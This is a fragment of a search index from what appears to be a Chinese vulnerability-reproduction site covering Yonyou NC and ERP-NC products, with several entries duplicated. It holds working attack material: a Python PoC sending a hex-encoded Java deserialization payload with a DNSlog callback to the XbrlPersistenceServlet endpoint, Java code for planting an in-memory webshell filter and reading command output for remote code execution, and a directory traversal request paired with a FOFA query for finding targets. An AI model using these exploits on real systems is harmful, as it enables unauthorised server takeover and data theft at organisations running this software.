, system = POC_1 ( target_url ) POC_2 ( target_url , id ) while True : if system == \"windows\" : File = input ( \" \\033 [35mFile >>> \\033 [0m\" ) if File == \"exit\" : sys . exit ( 0 ) else : POC_3 ( target_url , File ) if system == \"linux\" : File = input ( \" \\033 [35mFile >>> \\033 [0m\" ) if File == \"exit\" : sys . exit ( 0 ) else : POC_4 ( target_url , File )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20XbrlPersistenceServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","text":"\u7528\u53cb NC XbrlPersistenceServlet\u53cd\u5e8f\u5217\u5316 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u7528\u53cb NC XbrlPersistenceServlet\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u7528\u53cbNC \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u653b\u51fb\u961f\u5229\u7528\u7528\u53cbnc\u53cd\u5e8f\u5217\u5229\u7528 \u76ee\u524d\u6d4b\u8bd5\u5f71\u54cd\u7248\u672c\uff1anc6.5 \u6f0f\u6d1eurl\u4e3a\uff1a /service/~xbrl/XbrlPersistenceServlet poc\uff1a import requests import threadpool import urllib3 import sys import base64 ip = \"\" dnslog = \"\\x79\\x37\\x64\\x70\\\" #dnslog\u628a\u5b57\u7b26\u4e32\u8f6c16\u8fdb\u5236\u66ff\u6362\u8be5\u6bb5\uff0c\u6d4b\u8bd5\u7528\u7684ceye.io\u53ef\u4ee5\u56de\u663e data = \"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x01\\x73\\x72\\x00\\x0c\\x6a\\x61\\x76\\x61\\x2e\\x6e\\x65\\x74\\x2e\\x55\\x52\\x4c\\x96\\x25\\x37\\x36\\x1a\\xfc\\xe4\\x72\\x03\\x00\\x07\\x49\\x00\\x08\\x68\\x61\\x73\\x68\\x43\\x6f\\x64\\x65\\x49\\x00\\x04\\x70\\x6f\\x72\\x74\\x4c\\x00\\x09\\x61\\x75\\x74\\x68\\x6f\\x72\\x69\\x74\\x79\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x04\\x66\\x69\\x6c\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x04\\x68\\x6f\\x73\\x74\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x70\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x03\\x72\\x65\\x66\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x50\\x74\\x00\\x11\"+dnslog+\"\\x3a\\x38\\x30\\x74\\x00\\x00\\x74\\x00\\x0e\"+dnslog+\"\\x74\\x00\\x04\\x68\\x74\\x74\\x70\\x70\\x78\\x74\\x00\\x18\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\"+dnslog+\"\\x3a\\x38\\x30\\x78\" uploadHeader={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"} req = requests.post(\"http://+\"ip\"+/service/~xbrl/XbrlPersistenceServlet\", headers=uploadHeader, verify=False, data=data, timeout=25) print (req.text)","title":"\u7528\u53cb NC XbrlPersistenceServlet\u53cd\u5e8f\u5217\u5316"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20XbrlPersistenceServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#\u7528\u53cb-nc-xbrlpersistenceservlet\u53cd\u5e8f\u5217\u5316","text":"","title":"\u7528\u53cb NC XbrlPersistenceServlet\u53cd\u5e8f\u5217\u5316"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20XbrlPersistenceServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u7528\u53cb NC XbrlPersistenceServlet\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20XbrlPersistenceServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u7528\u53cbNC","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20XbrlPersistenceServlet%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#\u6f0f\u6d1e\u590d\u73b0","text":"\u653b\u51fb\u961f\u5229\u7528\u7528\u53cbnc\u53cd\u5e8f\u5217\u5229\u7528 \u76ee\u524d\u6d4b\u8bd5\u5f71\u54cd\u7248\u672c\uff1anc6.5 \u6f0f\u6d1eurl\u4e3a\uff1a /service/~xbrl/XbrlPersistenceServlet poc\uff1a import requests import threadpool import urllib3 import sys import base64 ip = \"\" dnslog = \"\\x79\\x37\\x64\\x70\\\" #dnslog\u628a\u5b57\u7b26\u4e32\u8f6c16\u8fdb\u5236\u66ff\u6362\u8be5\u6bb5\uff0c\u6d4b\u8bd5\u7528\u7684ceye.io\u53ef\u4ee5\u56de\u663e data = \"\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48\\x61\\x73\\x68\\x4d\\x61\\x70\\x05\\x07\\xda\\xc1\\xc3\\x16\\x60\\xd1\\x03\\x00\\x02\\x46\\x00\\x0a\\x6c\\x6f\\x61\\x64\\x46\\x61\\x63\\x74\\x6f\\x72\\x49\\x00\\x09\\x74\\x68\\x72\\x65\\x73\\x68\\x6f\\x6c\\x64\\x78\\x70\\x3f\\x40\\x00\\x00\\x00\\x00\\x00\\x0c\\x77\\x08\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x01\\x73\\x72\\x00\\x0c\\x6a\\x61\\x76\\x61\\x2e\\x6e\\x65\\x74\\x2e\\x55\\x52\\x4c\\x96\\x25\\x37\\x36\\x1a\\xfc\\xe4\\x72\\x03\\x00\\x07\\x49\\x00\\x08\\x68\\x61\\x73\\x68\\x43\\x6f\\x64\\x65\\x49\\x00\\x04\\x70\\x6f\\x72\\x74\\x4c\\x00\\x09\\x61\\x75\\x74\\x68\\x6f\\x72\\x69\\x74\\x79\\x74\\x00\\x12\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x6c\\x61\\x6e\\x67\\x2f\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\x4c\\x00\\x04\\x66\\x69\\x6c\\x65\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x04\\x68\\x6f\\x73\\x74\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x08\\x70\\x72\\x6f\\x74\\x6f\\x63\\x6f\\x6c\\x71\\x00\\x7e\\x00\\x03\\x4c\\x00\\x03\\x72\\x65\\x66\\x71\\x00\\x7e\\x00\\x03\\x78\\x70\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x50\\x74\\x00\\x11\"+dnslog+\"\\x3a\\x38\\x30\\x74\\x00\\x00\\x74\\x00\\x0e\"+dnslog+\"\\x74\\x00\\x04\\x68\\x74\\x74\\x70\\x70\\x78\\x74\\x00\\x18\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\"+dnslog+\"\\x3a\\x38\\x30\\x78\" uploadHeader={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\"} req = requests.post(\"http://+\"ip\"+/service/~xbrl/XbrlPersistenceServlet\", headers=uploadHeader, verify=False, data=data, timeout=25) print (req.text)","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/","text":"\u7528\u53cb NC \u53cd\u5e8f\u5217\u5316RCE\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u7528\u53cbNC \u5b58\u5728\u53cd\u5e8f\u5217\u5316 RCE\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u63a7\u5236\u670d\u52a1\u5668 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u7528\u53cb NC \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u9996\u5148\u4ece\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8bf4\u8d77 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5206\u6790\u4ee3\u7801\u5728 servlet.FileReceiveServlet \u3002\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u4ece\u8bf7\u6c42\u4e2d\u8bfb\u53d6\u6d41\uff0c\u7136\u540e\u8f6c\u6362\u4e3amap\u7c7b\u578b\u5e76\u8bfb\u53d6\u4e0a\u4f20\u6587\u4ef6\u7684\u8def\u5f84\u3002\u7136\u540e\u518d\u8bfb\u53d6\u5f85\u4e0a\u4f20\u7684\u6587\u4ef6\u3002 \u800c\u7f51\u4e0a\u5f88\u591apoc\uff0c\u5927\u591a\u90fd\u662f\u57fa\u4e8e\u6b64\u6f0f\u6d1e\uff0c\u5229\u7528\u53cd\u5e8f\u5217\u5316\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u5230\u670d\u52a1\u5668\u3002 \u8fd9\u4e5f\u5c31\u662f\u53bb\u5e74\u7684\u90a3\u4e2a\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u4f46\u662f\uff0c\u4f46\u662f\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u672c\u8d28\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u800c\u4e14\u67d0C\u7684classpath\u4e2d\uff0c\u4e5f\u5b58\u5728apache commonscollections\u5e93\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u5e93\uff0c\u76f4\u63a5\u6267\u884c\u547d\u4ee4\u6216\u8005\u5185\u5b58\u9a6c\u3002\u5c82\u4e0d\u662f\u6bd4\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8212\u670d\u591a\u4e86\u3002 \u5185\u5b58\u9a6c \u8001\u6837\u5b50\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u4e2d\u60f3\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u4e00\u822c\u90fd\u4f9d\u9760xalan\u8fd9\u4e2a\u5e93\u3002\u8fd9\u6b21\u4e5f\u4e0d\u4f8b\u5916\u3002 \u690d\u5165\u5185\u5b58\u9a6c\uff0c\u5173\u952e\u5728\u4e8e\u6211\u4eec\u600e\u6837\u627e\u5230context\uff0c\u53ea\u6709\u627e\u5230context\uff0c\u6211\u4eec\u624d\u53ef\u4ee5\u6dfb\u52a0filter\u3002\u597d\u5728\u67d0c\u4e2d\uff0c\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\u65e2\u53ef\u4ee5\u83b7\u53d6\u5f53\u524dcontext\uff0c\u4e0d\u9700\u8981\u4ecetomcat\u4e2d\u83b7\u53d6context Object obj = \u6539\u52a8Locator . getInstance (). lookup ( \"ServletContext\" ); Field contextField = obj . getClass (). getDeclaredField ( \"context\" ); contextField . setAccessible ( true ); obj = contextField . get ( obj ); Field contextField1 = obj . getClass (). getDeclaredField ( \"context\" ); contextField1 . setAccessible ( true ); addFitlertoTomcat ( contextField1 . get ( obj )); \u5269\u4e0b\u7684\u5c31\u662f\u5e38\u89c4\u64cd\u4f5c\uff0c\u53ef\u4ee5\u770b\u6211\u4e4b\u524d\u7684\u5185\u5b58\u9a6c\u6a21\u578b\uff0c\u57fa\u672c\u4e0d\u9700\u8981\u5f88\u5927\u7684\u6539\u52a8\u5373\u53ef\u5b8c\u7f8e\u9002\u914d\u3002 \u56de\u663e \u6211\u4eec\u53ea\u9700\u8981\u627e\u5230\u8fd9\u6837\u4e00\u4e2aservlet\uff0c\u5373\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u7684readObject\uff0c\u53c8\u5c06\u9519\u8bef\u4fe1\u606f\u5199\u5165\u5230response\u4e2d \u4e0d\u96be\u770b\u51fa uploadServlet \u5c31\u5f88\u6ee1\u8db3\u8fd9\u4e2a\u9700\u6c42\u3002 out = new ObjectOutputStream(output); in = new ObjectInputStream(request.getInputStream()); String dsName = (String)in.readObject(); } } catch (Exception var14) { var14.printStackTrace(); if (out == null) { throw new ServletException(var14); } out.writeObject(var14); \u5982\u679c\u51fa\u9519\u7684\u8bdd\uff0c\u5c06\u9519\u8bef\u4fe1\u606f\u901a\u8fc7\u5e8f\u5217\u5316\u5199\u5165\u5230response\u4e2d\u3002\u597d\u5904\u5728\u4e8e\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u9ebb\u70e6\u7684\u53bb\u627etomcat\u7684response\u5bf9\u8c61\u3002 \u6240\u4ee5\uff0c\u6211\u4eec\u5c06\u53cd\u5e8f\u5217\u5316\u7684payload\uff0c\u53d1\u9001\u7ed9uploadServlet\u5373\u53ef\u3002\u7136\u540e\u6211\u4eec\u53ea\u9700\u8981\u8bfb\u53d6\u54cd\u5e94\uff0c\u5373\u53ef\u62ff\u5230\u670d\u52a1\u5668\u547d\u4ee4\u6267\u884c\u7684\u56de\u663e\u7ed3\u679c\u3002\u5ba2\u6237\u7aef\u4ee3\u7801\u53ef\u4ee5\u8fd9\u6837\u5199 ObjectInputStream objectInputStream = new ObjectInputStream ( new ByteArrayInputStream ( r )); Exception e = ( Exception ) objectInputStream . readObject (); Object obj = e . getCause (); Field targetF = obj . getClass (). getDeclaredField ( \"target\" ); targetF . setAccessible ( true ); obj = targetF . get ( obj ); Field msgF = obj . getClass (). getSuperclass (). getDeclaredField ( \"detailMessage\" ); msgF . setAccessible ( true ); String msg = msgF . get ( obj ). toString (); System . out . println ( msg ); \u53c2\u8003\u6587\u7ae0 \u00b6 https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w","title":"\u7528\u53cb NC \u53cd\u5e8f\u5217\u5316RCE\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/#\u7528\u53cb-nc-\u53cd\u5e8f\u5217\u5316rce\u6f0f\u6d1e","text":"","title":"\u7528\u53cb NC \u53cd\u5e8f\u5217\u5316RCE\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u7528\u53cbNC \u5b58\u5728\u53cd\u5e8f\u5217\u5316 RCE\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u63a7\u5236\u670d\u52a1\u5668","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u7528\u53cb NC","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u9996\u5148\u4ece\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8bf4\u8d77 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5206\u6790\u4ee3\u7801\u5728 servlet.FileReceiveServlet \u3002\u5728\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u4ece\u8bf7\u6c42\u4e2d\u8bfb\u53d6\u6d41\uff0c\u7136\u540e\u8f6c\u6362\u4e3amap\u7c7b\u578b\u5e76\u8bfb\u53d6\u4e0a\u4f20\u6587\u4ef6\u7684\u8def\u5f84\u3002\u7136\u540e\u518d\u8bfb\u53d6\u5f85\u4e0a\u4f20\u7684\u6587\u4ef6\u3002 \u800c\u7f51\u4e0a\u5f88\u591apoc\uff0c\u5927\u591a\u90fd\u662f\u57fa\u4e8e\u6b64\u6f0f\u6d1e\uff0c\u5229\u7528\u53cd\u5e8f\u5217\u5316\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u5230\u670d\u52a1\u5668\u3002 \u8fd9\u4e5f\u5c31\u662f\u53bb\u5e74\u7684\u90a3\u4e2a\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u4f46\u662f\uff0c\u4f46\u662f\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u672c\u8d28\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3002\u800c\u4e14\u67d0C\u7684classpath\u4e2d\uff0c\u4e5f\u5b58\u5728apache commonscollections\u5e93\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u5e93\uff0c\u76f4\u63a5\u6267\u884c\u547d\u4ee4\u6216\u8005\u5185\u5b58\u9a6c\u3002\u5c82\u4e0d\u662f\u6bd4\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8212\u670d\u591a\u4e86\u3002 \u5185\u5b58\u9a6c \u8001\u6837\u5b50\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u4e2d\u60f3\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u4e00\u822c\u90fd\u4f9d\u9760xalan\u8fd9\u4e2a\u5e93\u3002\u8fd9\u6b21\u4e5f\u4e0d\u4f8b\u5916\u3002 \u690d\u5165\u5185\u5b58\u9a6c\uff0c\u5173\u952e\u5728\u4e8e\u6211\u4eec\u600e\u6837\u627e\u5230context\uff0c\u53ea\u6709\u627e\u5230context\uff0c\u6211\u4eec\u624d\u53ef\u4ee5\u6dfb\u52a0filter\u3002\u597d\u5728\u67d0c\u4e2d\uff0c\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\u65e2\u53ef\u4ee5\u83b7\u53d6\u5f53\u524dcontext\uff0c\u4e0d\u9700\u8981\u4ecetomcat\u4e2d\u83b7\u53d6context Object obj = \u6539\u52a8Locator . getInstance (). lookup ( \"ServletContext\" ); Field contextField = obj . getClass (). getDeclaredField ( \"context\" ); contextField . setAccessible ( true ); obj = contextField . get ( obj ); Field contextField1 = obj . getClass (). getDeclaredField ( \"context\" ); contextField1 . setAccessible ( true ); addFitlertoTomcat ( contextField1 . get ( obj )); \u5269\u4e0b\u7684\u5c31\u662f\u5e38\u89c4\u64cd\u4f5c\uff0c\u53ef\u4ee5\u770b\u6211\u4e4b\u524d\u7684\u5185\u5b58\u9a6c\u6a21\u578b\uff0c\u57fa\u672c\u4e0d\u9700\u8981\u5f88\u5927\u7684\u6539\u52a8\u5373\u53ef\u5b8c\u7f8e\u9002\u914d\u3002 \u56de\u663e \u6211\u4eec\u53ea\u9700\u8981\u627e\u5230\u8fd9\u6837\u4e00\u4e2aservlet\uff0c\u5373\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u7684readObject\uff0c\u53c8\u5c06\u9519\u8bef\u4fe1\u606f\u5199\u5165\u5230response\u4e2d \u4e0d\u96be\u770b\u51fa uploadServlet \u5c31\u5f88\u6ee1\u8db3\u8fd9\u4e2a\u9700\u6c42\u3002 out = new ObjectOutputStream(output); in = new ObjectInputStream(request.getInputStream()); String dsName = (String)in.readObject(); } } catch (Exception var14) { var14.printStackTrace(); if (out == null) { throw new ServletException(var14); } out.writeObject(var14); \u5982\u679c\u51fa\u9519\u7684\u8bdd\uff0c\u5c06\u9519\u8bef\u4fe1\u606f\u901a\u8fc7\u5e8f\u5217\u5316\u5199\u5165\u5230response\u4e2d\u3002\u597d\u5904\u5728\u4e8e\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u9ebb\u70e6\u7684\u53bb\u627etomcat\u7684response\u5bf9\u8c61\u3002 \u6240\u4ee5\uff0c\u6211\u4eec\u5c06\u53cd\u5e8f\u5217\u5316\u7684payload\uff0c\u53d1\u9001\u7ed9uploadServlet\u5373\u53ef\u3002\u7136\u540e\u6211\u4eec\u53ea\u9700\u8981\u8bfb\u53d6\u54cd\u5e94\uff0c\u5373\u53ef\u62ff\u5230\u670d\u52a1\u5668\u547d\u4ee4\u6267\u884c\u7684\u56de\u663e\u7ed3\u679c\u3002\u5ba2\u6237\u7aef\u4ee3\u7801\u53ef\u4ee5\u8fd9\u6837\u5199 ObjectInputStream objectInputStream = new ObjectInputStream ( new ByteArrayInputStream ( r )); Exception e = ( Exception ) objectInputStream . readObject (); Object obj = e . getCause (); Field targetF = obj . getClass (). getDeclaredField ( \"target\" ); targetF . setAccessible ( true ); obj = targetF . get ( obj ); Field msgF = obj . getClass (). getSuperclass (). getDeclaredField ( \"detailMessage\" ); msgF . setAccessible ( true ); String msg = msgF . get ( obj ). toString (); System . out . println ( msg );","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20NC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/","text":"\u7528\u53cbERP-NC \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u7528\u53cbERP-NC \u5b58\u5728\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u76ee\u5f55\u904d\u5386\u83b7\u53d6\u654f\u611f\u6587\u4ef6\u4fe1\u606f \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u7528\u53cbERP-NC FOFA \u00b6 [!NOTE] app=\"\u7528\u53cb-UFIDA-NC\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 POC\u4e3a /NCFindWeb?service=IPreAlertConfigService&filename= \u67e5\u770b ncwslogin.jsp \u6587\u4ef6 Goby & POC \u00b6 [!NOTE] YongYou ERP-NC directory traversal","title":"\u7528\u53cbERP-NC \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#\u7528\u53cberp-nc-\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e","text":"","title":"\u7528\u53cbERP-NC \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u7528\u53cbERP-NC \u5b58\u5728\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u76ee\u5f55\u904d\u5386\u83b7\u53d6\u654f\u611f\u6587\u4ef6\u4fe1\u606f","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u7528\u53cbERP-NC","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"\u7528\u53cb-UFIDA-NC\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"POC\u4e3a /NCFindWeb?service=IPreAlertConfigService&filename= \u67e5\u770b ncwslogin.jsp \u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BERP-NC%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] YongYou ERP-NC directory traversal","title":"Goby &amp; 